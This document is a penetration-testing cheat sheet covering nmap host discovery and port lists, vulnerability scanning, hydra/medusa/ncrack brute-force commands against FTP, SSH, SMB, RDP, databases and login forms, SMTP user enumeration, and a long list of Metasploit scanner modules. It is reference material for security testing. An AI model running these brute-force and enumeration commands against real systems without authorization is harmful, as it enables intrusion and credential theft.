FTP - Port 21
SSH - Port 22
Telnet - Port 23
SMTP | Port 25 and Submission Port 587
DNS - Port 53
Finger - Port 79
HTTP
Webmin
Jenkins
Apache Tomcat
JBoss
Lotus Domino httpd
IIS
VMware ESXi
Kerberos - Port 88
POP3 - Port 110
RPCInfo - Port 111
Ident - Port 113
NetBios
SNMP - Port 161
Check Point FireWall-1 Topology - Port 264
LDAP - Port 389
SMB - Port 445
rexec - Port 512
rlogin - Port 513
RSH - port 514
AFP - Apple Filing Protocol - Port 548
Microsoft Windows RPC Services | Port 135 and Microsoft RPC Services over HTTP | Port 593
HTTPS - Port 443 and 8443
RTSP - Port 554 and 8554
Rsync - Port 873
Java RMI - Port 1099
MS-SQL | Port 1433
Oracle - Port 1521
NFS - Port 2049
ISCSI - Port 3260
SAP Router | Port 3299
MySQL | Port 3306
Postgresql - Port 5432
HPDataProtector RCE - Port 5555
VNC - Port 5900
CouchDB - Port 5984
Other
Redis - Port 6379
AJP Apache JServ Protocol - Port 8009
PJL - Port 9100
Apache Cassandra - Port 9160
Network Data Management Protocol (ndmp) - Port 10000
Memcache - Port 11211
MongoDB - Port 27017 and Port 27018
EthernetIP-TCP-UDP - Port 44818
UDP BACNet - Port 47808

# Ping sweep :
nmap -sP -PE -PP -PS21,22,23,25,80,113,31339 -PA80,113,443,10042 --source-port 53 -T4 -iL IPs.txt -oX discover.xml | grep "report for" | cut -d " " -f 5

nmap -n -sL -iR 50000 -oN - | grep "not scanned" | awk '{print $2}' | sort -n > 50K_IPs
map -v -n -PE <target>
nmap -v -n -PE -PO -PM -PP <target>
nmap -v -n -PS21-23,25,53,80,443,3389 -PO -PE -PM -PP <target>
nmap -sL -n 192.168.1.1-100,102-254 | grep "report for" | cut -d " " -f 5 > ip_list_192.168.1.txt
nmap -sL 54.248.103.0/24 -oG - | grep -v '(\w*)' | grep -v Nmap | awk '{ print $2 " " $3 }'

# scan network with Firewall :
# nmap --script firewalk --traceroute 192.168.20.2
# traceroute 192.168.20.2
# hping3 -S 192.168.20.2 -C 100 -P ++1
# hping –R 192.168.0.100

# TCP SYN/ACK, UDP or SCTP discovery to given ports
nmap -PS/PA/PU/PY
# ICMP echo, timestamp, and netmask request discovery probes
nmap -PE/PP/PM

# Never do DNS resolution/Always resolve [default: sometimes]
Never do DNS resolution  | -n 
Always resolve | -R

# Scan Techniques
TCP SYN scan -sS
Connect scan -sT
ACK scan -sA
Window scan-sW
Maimon scan -sM
UDP Scan -sU
TCP Null scan -sN
FIN scan -sF
Xmas scan -sX
IP protocol scan -sO
Scan UDP ports with Nmap, e.g. -p U:53,161
Scan "number" most common ports --top-ports "1000"

More : 
https://highon.coffee/blog/nmap-cheat-sheet/



List of ports :
1,7,9,13,19,21-23,25,37,42,49,53,69,79-81,85,105,109-111,113,123,135,137-139,143,161,179,222,264,384,389,402,407,443-446,465,500,502,512-515,523-524,540,548,554,587,617,623,689,705,771,783,888,902,910,912,921,993,995,998,1000,1024,1030,1035,1090,1098-1103,1128-1129,1158,1199,1211,1220,1234,1241,1300,1311,1352,1433-1435,1440,1494,1521,1530,1533,1581-1582,1604,1720,1723,1755,1811,1900,2000-2001,2049,2100,2103,2121,2199,2207,2222,2323,2362,2380-2381,2525,2533,2598,2638,2809,2947,2967,3000,3037,3050,3057,3128,3200,3217,3273,3299,3306,3389,3460,3500,3628,3632,3690,3780,3790,3817,4000,4322,4433,4444-4445,4659,4679,4848,5000,5038,5040,5051,5060-5061,5093,5168,5247,5250,5351,5353,5355,5400,5405,5432-5433,5498,5520-5521,5554-5555,5560,5580,5631-5632,5666,5800,5814,5900-5910,5920,5984-5986,6000,6050,6060,6070,6080,6101,6106,6112,6262,6379,6405,6502-6504,6542,6660-6661,6667,6905,6988,7001,7021,7071,7080,7144,7181,7210,7443,7510,7579-7580,7700,7770,7777-7778,7787,7800-7801,7879,7902,8000-8001,8008,8014,8020,8023,8028,8030,8080-8082,8087,8090,8095,8161,8180,8205,8222,8300,8303,8333,8400,8443-8444,8503,8800,8812,8834,8880,8888-8890,8899,8901-8903,9000,9002,9080-9081,9084,9090,9099-9100,9111,9152,9200,9390-9391,9495,9809-9815,9855,9999-10001,10008,10050-10051,10080,10098,10162,10202-10203,10443,10616,10628,11000,11099,11211,11234,11333,12174,12203,12221,12345,12397,12401,13364,13500,13838,14330,15200,16102,17185,17200,18881,19300,19810,20010,20031,20034,20101,20111,20171,20222,22222,23472,23791,23943,25000,25025,26000,26122,27000,27017,27888,28222,28784,30000,30718,31001,31099,32764,32913,34205,34443,37718,38080,38292,40007,41025,41080,41523-41524,44334,44818,45230,46823-46824,47001-47002,48899,49152,50000-50004,50013,50500-50504,52302,55553,57772,62078,62514,65535


This is a list of common ports that will give you a pretty good list of "alive" system when scanning internally or externally.

	21,22,23,25,79,80,88,110,111,139,143,389,443,445,514,631,2049,1352,3000,3389,4949,5060,5631,5632,5666,6000-6009,8080,8000,8443,9080,8006,8089,9443,8834,17500,5900,5901,6000-6009
	
	easy copy - 21,22,23,25,139,443,445,631,3389,6000-6009,8080,8000,8443
	FTP: 21
	SSH: 22
	Telnet: 23
	SMTP: 25
	Finger: 79
	HTTP: 80
	Kerberos: 88
	POP3: 110
	SUNRPC (Unix RPC): 111 (think: rpcinfo)
	NetBIOS: 139
	IMAP 143
	LDAP: 389
	HTTPS: 443
	LotusNotes: 1352
	Microsoft DS: 445
	RSH: 514
	CUPS: 631
	NFS: 2049
	Webrick(Ruby Webserver): 3000
	RDP: 3389
	Munin: 4949
	SIP: 5060 *PCAnywhere: 5631 (5632)
	NRPE (*nix) /NSCLIENT++ (win): 5666 (evidence of Nagios server on network)
	Alt-HTTP: 8080
	Alt-HTTP tomcat: 9080
	Another HTTP: 8000 (mezzanine in development mode for example)
	Nessus HTTPS: 8834
	Proxmox: 8006
	Splunk: 8089 (also on 8000)
	Alt HTTPS: 8443
	vSphere: 9443
	X11: 6000-6009 (+1 to portnum for additional displays) (see xspy, xwd, xkey for exploitation)
	VNC: 5900, 5901+ (Same as X11; +1 to portnum for each user/dipslay over VNC. SPICE is usually in this range as well) Printers: 9100, 515
	Dropbox lansync: 17500

	
## UDP Discovery

	easy copy - 53,123,161,1434
	DNS: 53
	XDMCP: 177 (via NSE script --script broadcast-xdmcp-discover, discover nix boxes hosting X)
	OpenVPN: 1194
	MSSQL Ping: 1434
	SUNRPC (Unix RPC): 111 (yeah, it's UDP, too)
	SNMP 161
	Network Time Protocol (NTP): 123
	syslog : 514
	UPNP: 1900
	Isakmp - 500 (ike PSK Attack)
	vxworks debug: 17185 (udp)
	
## Authentication Ports

	easy copy - 1494
	Citrix: 1494
	WinRM: 80,5985 (HTTP), 5986 (HTTPS)
	VMware Server: 8200, 902, 9084
	DameWare: 6129

## Easy-win Ports:

	Java RMI - 1099, 1098
	coldfusion default stand alone - 8500
	IPMI UDP(623) (easy crack or auth bypass)
	6002, 7002 (sentinel license monitor (reverse dir traversal, sometimes as SYSTEM))
	GlassFish: 4848
	easy copy - 9060
	IBM Web Sphere: 9060
	Webmin or BackupExec: 10000
	memcached: 11211
	DistCC: 3632
	SAP Router: 3299
	
## Database Ports

	easy copy - 3306,1521-1527,5432,5433,1433,3050,3351,1583,8471,9471
	MySQL: 3306
	PostgreSQL: 5432
	PostgreSQL 9.2: 5433
	Oracle TNS Listener: 1521-1527
	Oracle XDB: 2100
	MSSQL: 1433
	Firebird / Interbase: 3050
	PervasiveSQL: 3351, 1583
	DB2/AS400 8471, 9471
	Sybase 5000

## NoSQL Ports

	easy copy - 27017,28017,27080,5984,900,9160,7474,6379,8098
	MongoDB: 27017,28017,27080
	CouchDB: 5984
	Hbase 9000
	Cassandra:9160
	Neo4j: 7474
	Redis: 6379
	Riak: 8098
	
## SCADA / ICS

source: http://www.digitalbond.com/tools/the-rack/control-system-port-list/ )

	BACnet/IP: UDP/47808
	DNP3: TCP/20000, UDP/20000
	EtherCAT: UDP/34980
	Ethernet/IP: TCP/44818, UDP/2222, UDP/44818
	FL-net: UDP/55000 to 55003
	Foundation Fieldbus HSETCP/1089 to 1091, UDP/1089 to 1091
	ICCP: TCP/102
	Modbus TCP: TCP/502
	OPC UA Binary: Vendor Application Specific
	OPC UA Discovery Server: TCP/4840
	OPC UA XML: TCP/80, TCP/443
	PROFINET: TCP/34962 to 34964, UDP/34962 to 34964
	ROC PLus: TCP/UDP 4000
	

###  Vulnerable  Scan ###

	whatweb <ip>
	golismero SCAN <ip>
	nikto -h <ip> -p 1234 <ip>
	nikto -C all -h 192.168.1.1 -p 80
	nikto -C all -h 192.168.1.1 -p 443
	nmap -v -sS -sV --script=vulscan.nse --script-args vulscandb=exploitdb.csv target
	nmap -sS -sV --script=vulscan.nse --script-args vulscandb=exploitdb.csv -p80 target
	nmap -sV --script=vuln target
	nmap -PN -sS -sV --script=all --script-args vulscancorrelation=1 target


###  Search for Vulnerability  ###
	searchsploit xxx | grep linux
	site:exploit-db.com APP VERSION
	site:rapid7.com "set TARGET" Sendmail
	site:rapid7.com "use auxiliary" MSSQL
	search type:exploit port:139
	search samba type:exploit port:445
	grep rpc search Microsoft Windows RPC

###  HTTP Enumerating
- Brute-force , check http , https website ,enumerate one by one
- default login for service or applicatin  , check reset password
- check Default credentials for software
- SQL-injectable GET/POST params
- LFI/RFI through ?page=foo type params /etc/passwd , ../../../../../boot.ini
- Check config.php and get sql login
- Heartbleed / CRIME find out potential correct vhost to GET , any names that could be usernames for bruteforce/guessing

### Xprobe2 OS fingerprinting

xprobe2 -v -p tcp:80:open IP


### Brute-force 
FTP :
hydra -l superuser -P pwd.txt -v -f -e ns -t 5 -w 20 192.168.67.132 ftp >> brute_ftp.out
hydra -t 5 -V -f -l root -P common.txt ftp://192.168.67.132 >> brute_ftp.out
hydra -v -f -l ftp -P fpass.lst -t 10 ftp://11.11.11.11 >> brute_ftp.out
hydra -l root -P 500-worst-passwords.txt 10.10.10.10 ftp
medusa -u test -P 500-worst-passwords.txt -h 10.10.10.10 -M ftp
medusa -M ftp -h host -u username -p password

SSH :
medusa -h 10.10.XX -P /root/pasword.txt -u root -M ssh
ncrack -p ssh -u root --pass 'root' -iL in
hydra -t 5 -V -f -l root -P common.txt localhost ssh >> brute_ssh.out
hydra -v -l root -P 500-worst-passwords.txt 10.10.10.10 ssh >> brute_ssh.out
hydra -v -l root -P fpass.lst -t 5 ssh://ip -o brute_ssh.out

Telnet :
hydra -v -l root -P fpass.lst -t 5 telnet://$ip >> brute_telnet.out
hydra -l username -P wordlist -t 4 -s 23 -e ns -f -v 10.10.10.10 telnet >> brute_telnet.out
medusa -h 192.168.0.171 -M telnet -U user.txt -P password.txt

SMTP :
medusa -M smtp -m AUTH:NTLM -U accounts.txt -p password
medusa -M smtp -m EHLO:world -U accounts.txt -p password

SMTP VRFY :
medusa -M smtp-vrfy -m VERB:VRFY -U accounts.txt -p domain.com
smtp-user-enum -M VRFY -U /home/weak_wordlist/userall.txt -t 192.168.3.10

SMTP RCPT TO :
medusa -M smtp-vrfy -m VERB:RCPT TO -U accounts.txt -p domain.com

HTTP :
hydra -m /tip/ -L Userid.txt -p 12345678 -e s -V -f 10.12.80.80 http-get

HTTPS :
hydra -m /tip/ -L Userid.txt -P List.txt -e s -V -f 10.12.80.80 https-get

POP3 :
medusa -M pop3 -m MODE:AS400 -U accounts.txt -p password
medusa -M pop3 -m DOMAIN:foo.com -U accounts.txt -p password
hydra -l muts -P pass.txt my.pop3.mail pop3 >> brute_pop3.out
hydra -S -l myemailaddress@hotmail.co.uk -P password.lst pop3.live.com -s 995 pop3 >> brute_pop3.out

basic auth NTLM:
hydra -m /_layouts/15/Authenticate.aspx -L id.txt -P pass.txt -e s -V -f XXX.COM https-get >> brute_ntlm.out
hydra -m /webdev -l admin -P Password.txt -V -F 10.11.1.237 http-get >> brute_ntlm.out
hydra -m /reports -l admin -P worst-passwords.txt -V -F xxxxx.sa http-get >> brute_ntlm.out
hydra -m /webdev -l admin -P Password.txt -V -F 10.11.1.17 http-head >> brute_ntlm.out

poppassd :
IMAP4 :
LDAP :

SMB :
hydra  -v  -l Administrator -P fpass.lst smb://11.1.11.1 >> brute_smb.out
medusa -h 192.168.0.20 -u administrator -P passwords.txt -e ns -M smbnt >> brute_smb.out
hydra -L user.txt -P pass.txt -e ns -f -v -V -w5 10.10.10.2 smb >> brute_smb.out

Cisco :
hydra -f -v -P pass.txt 10.10.10.2 cisco >> brute_cisco.out
hydra -m cloud -P pass.txt 192.168.1.11 cisco-enable >> brute_cisco.out

MSSQL :
hydra -v -l sa -P fpass.lst -t 4 10.10.10.2 mssql -o brute_mssql.out
hydra -t 5 -V -f -l sa -P "C:\pass.txt" 1.2.144.244 mssql
hydra mssql://172.22.71.247:1433 -l sa -P /root/Desktop/parolalar

Oracle :

MySQL :
hydra -t 5 -V -f -l root -e ns -P common.txt localhost mysql
hydra -v -l root -P fpass.lst -t 1 mysql://ip -o brute_mysql.out

RDP :
medusa -u administrator -P /usr/share/john/password.lst -h 10.10.10.71 -M rdp
ncrack -p rdp -u administrator --pass 'password' -iL in2
hydra -v -f -l administrator -P common.txt rdp://192.168.67.132 // not good
ncrack -vv --user offsec -P password-file.txt rdp://10.10.10.10


PostgreSQL :
VNC :

SNMP :
hydra -P password-file.txt -v 10.10.10.10 snmp

Teamspeak :
hydra -l username -P wordlist -s portnumber -vV ip teamspeak >> brute_teamspeak.out

http-proxy :
hydra -v -l admin -P pass.txt http-proxy://192.168.1.111 >> brute_http-proxy.out

webform :
hydra -t 4 -l admin -V -P common.txt 192.168.206.1 http-form-post "/login/log.php:user=^USER^&password=^PASS^:S=success"
hydra -t 4 -l admin -V -P common.txt 192.168.206.1 http-form-post "/login/log.php:user=^USER^&password=^PASS^:fail"


Syntax:
Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
###############################################################################################
-h [TEXT]    : Target hostname or IP address
-H [FILE]    : File containing target hostnames or IP addresses
-u [TEXT]    : Username to test
-U [FILE]    : File containing usernames to test
-p [TEXT]    : Password to test
-P [FILE]    : File containing passwords to test
-C [FILE]    : File containing combo entries. See README for more information.
-O [FILE]    : File to append log information to
-e [n/s/ns]  : Additional password checks ([n] No Password, [s] Password = Username)
-M [TEXT]    : Name of the module to execute (without the .mod extension)
-m [TEXT]    : Parameter to pass to the module. This can be passed multiple times with a
               different parameter each time and they will all be sent to the module (i.e.
               -m Param1 -m Param2, etc.)
-d           : Dump all known modules
-n [NUM]     : Use for non-default TCP port number
-s           : Enable SSL
-g [NUM]     : Give up after trying to connect for NUM seconds (default 3)
-r [NUM]     : Sleep NUM seconds between retry attempts (default 3)
-R [NUM]     : Attempt NUM retries before giving up. The total number of attempts will be NUM + 1.
-c [NUM]     : Time to wait in usec to verify socket is available (default 500 usec).
-t [NUM]     : Total number of logins to be tested concurrently
-T [NUM]     : Total number of hosts to be tested concurrently
-L           : Parallelize logins using one username per thread. The default is to process 
               the entire username before proceeding.
-f           : Stop scanning host after first valid username/password found.
-F           : Stop audit after first valid username/password found on any host.
-b           : Suppress startup banner
-q           : Display module's usage information
-v [NUM]     : Verbose level [0 - 6 (more)]
-w [NUM]     : Error debug level [0 - 10 (more)]
-V           : Display version
-Z [TEXT]    : Resume scan based on map of previous scan
##################################################################



# SMTP user Eum :
Manuel method by telnet :

	nc -nv 10.11.1.215 25
	VRFY root
	VRFY username   (verifies if username exists - enumeration of accounts)
    EXPN username   (verifies if username is valid - enumeration of user)
    RCPT TO:username
    reply 250 mean user exist
    reply 550 means user does not exit


Automated tools :
	download : https://github.com/jbarcia/TrustedSec/tree/master/recon_scan
	cd /Desktop/enum
	./smtprecon.py 10.11.1.22
	
	msfconsole 
	use auxiliary/scanner/smtp/smtp_enum
	set RHOSTS 10.11.1.22
	set USER_FILE /usr/share/seclists/Usernames/Names/names.txt
	exploit 
	##########################################################
	smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 10.11.1.22 -v
	#########################################################
	./patator.py smtp_vrfy timeout=15 host=10.11.1.22 user=FILE0 0=/usr/share/seclists/Usernames/Names/names.txt
	#########################################################
	nmap --script smtp-enum-users.nse --script-args smtp-enum-users.methods={VRFY} -p 25 10.11.1.22
	Notes : update file : /usr/share/nmap/nselib/data/usernames.lst
	** NEED TO MAKE THREADED – VERY SLOW **
	SAMRDUMP.PY – (/pentest/python/impacket-examples/samrdump.py)
	– ./samrdump.py SNMP server


# Mysql Enumeration:

nmap -sV -Pn -vv –script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.0.0.1 -p 3306



# SNMP 

it will show information about target :
nmap :
nmap -sU  172.16.201.130 -p161 --script=snmp-brute  -Pn --script-args snmp-brute.communitiesdb=list.txt
FILE : /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
python snmpbrute.py -t <ip>

use auxiliary/scanner/snmp/aix_version
use auxiliary/scanner/snmp/arris_dg950
use auxiliary/scanner/snmp/brocade_enumhash
use auxiliary/scanner/snmp/cisco_config_tftp
use auxiliary/scanner/snmp/cisco_upload_file
use auxiliary/scanner/snmp/netopia_enum
use auxiliary/scanner/snmp/sbg6580_enum
use auxiliary/scanner/snmp/snmp_enum
use auxiliary/scanner/snmp/snmp_enum_hp_laserjet
use auxiliary/scanner/snmp/snmp_enumshares
use auxiliary/scanner/snmp/snmp_enumusers
use auxiliary/scanner/snmp/snmp_login
use auxiliary/scanner/snmp/snmp_set
use auxiliary/scanner/snmp/ubee_ddw3611
use auxiliary/scanner/snmp/xerox_workcentre_enumusers


# 


use auxiliary/scanner/acpp/login
use auxiliary/scanner/afp/afp_login
use auxiliary/scanner/afp/afp_server_info
use auxiliary/scanner/backdoor/energizer_duo_detect
use auxiliary/scanner/chargen/chargen_probe
use auxiliary/scanner/couchdb/couchdb_enum
use auxiliary/scanner/couchdb/couchdb_login
use auxiliary/scanner/db2/db2_auth
use auxiliary/scanner/db2/db2_version
use auxiliary/scanner/db2/discovery
use auxiliary/scanner/dcerpc/endpoint_mapper
use auxiliary/scanner/dcerpc/hidden
use auxiliary/scanner/dcerpc/management
use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor
use auxiliary/scanner/dcerpc/windows_deployment_services
use auxiliary/scanner/dect/call_scanner
use auxiliary/scanner/dect/station_scanner
use auxiliary/scanner/discovery/arp_sweep
use auxiliary/scanner/discovery/empty_udp
use auxiliary/scanner/discovery/ipv6_multicast_ping
use auxiliary/scanner/discovery/ipv6_neighbor
use auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement
use auxiliary/scanner/discovery/udp_probe
use auxiliary/scanner/discovery/udp_sweep
use auxiliary/scanner/dlsw/dlsw_leak_capture
use auxiliary/scanner/dns/dns_amp
use auxiliary/scanner/elasticsearch/indices_enum
use auxiliary/scanner/emc/alphastor_devicemanager
use auxiliary/scanner/emc/alphastor_librarymanager
use auxiliary/scanner/finger/finger_users
use auxiliary/scanner/ftp/anonymous
use auxiliary/scanner/ftp/bison_ftp_traversal
use auxiliary/scanner/ftp/colorado_ftp_traversal
use auxiliary/scanner/ftp/ftp_login
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/konica_ftp_traversal
use auxiliary/scanner/ftp/pcman_ftp_traversal
use auxiliary/scanner/ftp/titanftp_xcrc_traversal
use auxiliary/scanner/h323/h323_version
use auxiliary/scanner/http/a10networks_ax_directory_traversal
use auxiliary/scanner/http/accellion_fta_statecode_file_read
use auxiliary/scanner/http/adobe_xml_inject
use auxiliary/scanner/http/allegro_rompager_misfortune_cookie
use auxiliary/scanner/http/apache_activemq_source_disclosure
use auxiliary/scanner/http/apache_activemq_traversal
use auxiliary/scanner/http/apache_mod_cgi_bash_env
use auxiliary/scanner/http/apache_userdir_enum
use auxiliary/scanner/http/appletv_login
use auxiliary/scanner/http/atlassian_crowd_fileaccess
use auxiliary/scanner/http/axis_local_file_include
use auxiliary/scanner/http/axis_login
use auxiliary/scanner/http/backup_file
use auxiliary/scanner/http/barracuda_directory_traversal
use auxiliary/scanner/http/bitweaver_overlay_type_traversal
use auxiliary/scanner/http/blind_sql_query
use auxiliary/scanner/http/bmc_trackit_passwd_reset
use auxiliary/scanner/http/brute_dirs
use auxiliary/scanner/http/buffalo_login
use auxiliary/scanner/http/caidao_bruteforce_login
use auxiliary/scanner/http/canon_wireless
use auxiliary/scanner/http/cert
use auxiliary/scanner/http/chef_webui_login
use auxiliary/scanner/http/chromecast_webserver
use auxiliary/scanner/http/cisco_asa_asdm
use auxiliary/scanner/http/cisco_device_manager
use auxiliary/scanner/http/cisco_ios_auth_bypass
use auxiliary/scanner/http/cisco_ironport_enum
use auxiliary/scanner/http/cisco_nac_manager_traversal
use auxiliary/scanner/http/cisco_ssl_vpn
use auxiliary/scanner/http/cisco_ssl_vpn_priv_esc
use auxiliary/scanner/http/clansphere_traversal
use auxiliary/scanner/http/coldfusion_locale_traversal
use auxiliary/scanner/http/coldfusion_version
use auxiliary/scanner/http/concrete5_member_list
use auxiliary/scanner/http/copy_of_file
use auxiliary/scanner/http/crawler
use auxiliary/scanner/http/dell_idrac
use auxiliary/scanner/http/dir_listing
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/dir_webdav_unicode_bypass
use auxiliary/scanner/http/dlink_dir_300_615_http_login
use auxiliary/scanner/http/dlink_dir_615h_http_login
use auxiliary/scanner/http/dlink_dir_session_cgi_http_login
use auxiliary/scanner/http/dlink_user_agent_backdoor
use auxiliary/scanner/http/dolibarr_login
use auxiliary/scanner/http/drupal_views_user_enum
use auxiliary/scanner/http/ektron_cms400net
use auxiliary/scanner/http/elasticsearch_traversal
use auxiliary/scanner/http/enum_wayback
use auxiliary/scanner/http/error_sql_injection
use auxiliary/scanner/http/etherpad_duo_login
use auxiliary/scanner/http/f5_bigip_virtual_server
use auxiliary/scanner/http/f5_mgmt_scanner
use auxiliary/scanner/http/file_same_name_dir
use auxiliary/scanner/http/files_dir
use auxiliary/scanner/http/frontpage_login
use auxiliary/scanner/http/git_scanner
use auxiliary/scanner/http/gitlab_login
use auxiliary/scanner/http/gitlab_user_enum
use auxiliary/scanner/http/glassfish_login
use auxiliary/scanner/http/goahead_traversal
use auxiliary/scanner/http/groupwise_agents_http_traversal
use auxiliary/scanner/http/host_header_injection
use auxiliary/scanner/http/hp_imc_bims_downloadservlet_traversal
use auxiliary/scanner/http/hp_imc_faultdownloadservlet_traversal
use auxiliary/scanner/http/hp_imc_ictdownloadservlet_traversal
use auxiliary/scanner/http/hp_imc_reportimgservlt_traversal
use auxiliary/scanner/http/hp_imc_som_file_download
use auxiliary/scanner/http/hp_sitescope_getfileinternal_fileaccess
use auxiliary/scanner/http/hp_sitescope_getsitescopeconfiguration
use auxiliary/scanner/http/hp_sitescope_loadfilecontent_fileaccess
use auxiliary/scanner/http/hp_sys_mgmt_login
use auxiliary/scanner/http/http_header
use auxiliary/scanner/http/http_hsts
use auxiliary/scanner/http/http_login
use auxiliary/scanner/http/http_put
use auxiliary/scanner/http/http_traversal
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/httpbl_lookup
use auxiliary/scanner/http/iis_internal_ip
use auxiliary/scanner/http/influxdb_enum
use auxiliary/scanner/http/infovista_enum
use auxiliary/scanner/http/ipboard_login
use auxiliary/scanner/http/jboss_status
use auxiliary/scanner/http/jboss_vulnscan
use auxiliary/scanner/http/jenkins_command
use auxiliary/scanner/http/jenkins_enum
use auxiliary/scanner/http/jenkins_login
use auxiliary/scanner/http/joomla_bruteforce_login
use auxiliary/scanner/http/joomla_ecommercewd_sqli_scanner
use auxiliary/scanner/http/joomla_gallerywd_sqli_scanner
use auxiliary/scanner/http/joomla_pages
use auxiliary/scanner/http/joomla_plugins
use auxiliary/scanner/http/joomla_version
use auxiliary/scanner/http/linknat_vos_traversal
use auxiliary/scanner/http/linksys_e1500_traversal
use auxiliary/scanner/http/litespeed_source_disclosure
use auxiliary/scanner/http/lucky_punch
use auxiliary/scanner/http/majordomo2_directory_traversal
use auxiliary/scanner/http/manageengine_desktop_central_login
use auxiliary/scanner/http/manageengine_deviceexpert_traversal
use auxiliary/scanner/http/manageengine_deviceexpert_user_creds
use auxiliary/scanner/http/manageengine_securitymanager_traversal
use auxiliary/scanner/http/mediawiki_svg_fileaccess
use auxiliary/scanner/http/mod_negotiation_brute
use auxiliary/scanner/http/mod_negotiation_scanner
use auxiliary/scanner/http/ms09_020_webdav_unicode_bypass
use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
use auxiliary/scanner/http/mybook_live_login
use auxiliary/scanner/http/netdecision_traversal
use auxiliary/scanner/http/netgear_sph200d_traversal
use auxiliary/scanner/http/nginx_source_disclosure
use auxiliary/scanner/http/novell_file_reporter_fsfui_fileaccess
use auxiliary/scanner/http/novell_file_reporter_srs_fileaccess
use auxiliary/scanner/http/novell_mdm_creds
use auxiliary/scanner/http/ntlm_info_enumeration
use auxiliary/scanner/http/octopusdeploy_login
use auxiliary/scanner/http/open_proxy
use auxiliary/scanner/http/openmind_messageos_login
use auxiliary/scanner/http/options
use auxiliary/scanner/http/oracle_demantra_database_credentials_leak
use auxiliary/scanner/http/oracle_demantra_file_retrieval
use auxiliary/scanner/http/oracle_ilom_login
use auxiliary/scanner/http/owa_ews_login
use auxiliary/scanner/http/owa_iis_internal_ip
use auxiliary/scanner/http/owa_login
use auxiliary/scanner/http/pocketpad_login
use auxiliary/scanner/http/prev_dir_same_name_file
use auxiliary/scanner/http/radware_appdirector_enum
use auxiliary/scanner/http/rails_json_yaml_scanner
use auxiliary/scanner/http/rails_mass_assignment
use auxiliary/scanner/http/rails_xml_yaml_scanner
use auxiliary/scanner/http/replace_ext
use auxiliary/scanner/http/rewrite_proxy_bypass
use auxiliary/scanner/http/rfcode_reader_enum
use auxiliary/scanner/http/rips_traversal
use auxiliary/scanner/http/robots_txt
use auxiliary/scanner/http/s40_traversal
use auxiliary/scanner/http/sap_businessobjects_user_brute
use auxiliary/scanner/http/sap_businessobjects_user_brute_web
use auxiliary/scanner/http/sap_businessobjects_user_enum
use auxiliary/scanner/http/sap_businessobjects_version_enum
use auxiliary/scanner/http/scraper
use auxiliary/scanner/http/sentry_cdu_enum
use auxiliary/scanner/http/servicedesk_plus_traversal
use auxiliary/scanner/http/sevone_enum
use auxiliary/scanner/http/simple_webserver_traversal
use auxiliary/scanner/http/smt_ipmi_49152_exposure
use auxiliary/scanner/http/smt_ipmi_cgi_scanner
use auxiliary/scanner/http/smt_ipmi_static_cert_scanner
use auxiliary/scanner/http/smt_ipmi_url_redirect_traversal
use auxiliary/scanner/http/soap_xml
use auxiliary/scanner/http/sockso_traversal
use auxiliary/scanner/http/splunk_web_login
use auxiliary/scanner/http/squid_pivot_scanning
use auxiliary/scanner/http/squiz_matrix_user_enum
use auxiliary/scanner/http/ssl
use auxiliary/scanner/http/ssl_version
use auxiliary/scanner/http/support_center_plus_directory_traversal
use auxiliary/scanner/http/svn_scanner
use auxiliary/scanner/http/svn_wcdb_scanner
use auxiliary/scanner/http/sybase_easerver_traversal
use auxiliary/scanner/http/symantec_brightmail_ldapcreds
use auxiliary/scanner/http/symantec_brightmail_logfile
use auxiliary/scanner/http/symantec_web_gateway_login
use auxiliary/scanner/http/titan_ftp_admin_pwd
use auxiliary/scanner/http/title
use auxiliary/scanner/http/tomcat_enum
use auxiliary/scanner/http/tomcat_mgr_login
use auxiliary/scanner/http/tplink_traversal_noauth
use auxiliary/scanner/http/trace
use auxiliary/scanner/http/trace_axd
use auxiliary/scanner/http/typo3_bruteforce
use auxiliary/scanner/http/vcms_login
use auxiliary/scanner/http/verb_auth_bypass
use auxiliary/scanner/http/vhost_scanner
use auxiliary/scanner/http/wangkongbao_traversal
use auxiliary/scanner/http/web_vulndb
use auxiliary/scanner/http/webdav_internal_ip
use auxiliary/scanner/http/webdav_scanner
use auxiliary/scanner/http/webdav_website_content
use auxiliary/scanner/http/webpagetest_traversal
use auxiliary/scanner/http/wildfly_traversal
use auxiliary/scanner/http/wordpress_cp_calendar_sqli
use auxiliary/scanner/http/wordpress_ghost_scanner
use auxiliary/scanner/http/wordpress_login_enum
use auxiliary/scanner/http/wordpress_multicall_creds
use auxiliary/scanner/http/wordpress_pingback_access
use auxiliary/scanner/http/wordpress_scanner
use auxiliary/scanner/http/wordpress_xmlrpc_login
use auxiliary/scanner/http/wp_contus_video_gallery_sqli
use auxiliary/scanner/http/wp_dukapress_file_read
use auxiliary/scanner/http/wp_gimedia_library_file_read
use auxiliary/scanner/http/wp_mobile_pack_info_disclosure
use auxiliary/scanner/http/wp_mobileedition_file_read
use auxiliary/scanner/http/wp_nextgen_galley_file_read
use auxiliary/scanner/http/wp_simple_backup_file_read
use auxiliary/scanner/http/wp_subscribe_comments_file_read
use auxiliary/scanner/http/xpath
use auxiliary/scanner/http/yaws_traversal
use auxiliary/scanner/http/zabbix_login
use auxiliary/scanner/http/zenworks_assetmanagement_fileaccess
use auxiliary/scanner/http/zenworks_assetmanagement_getconfig
use auxiliary/scanner/ike/cisco_ike_benigncertain
use auxiliary/scanner/imap/imap_version
use auxiliary/scanner/ip/ipidseq
use auxiliary/scanner/ipmi/ipmi_cipher_zero
use auxiliary/scanner/ipmi/ipmi_dumphashes
use auxiliary/scanner/ipmi/ipmi_version
use auxiliary/scanner/jenkins/jenkins_udp_broadcast_enum
use auxiliary/scanner/kademlia/server_info
use auxiliary/scanner/llmnr/query
use auxiliary/scanner/lotus/lotus_domino_hashes
use auxiliary/scanner/lotus/lotus_domino_login
use auxiliary/scanner/lotus/lotus_domino_version
use auxiliary/scanner/mdns/query
use auxiliary/scanner/misc/cctv_dvr_login
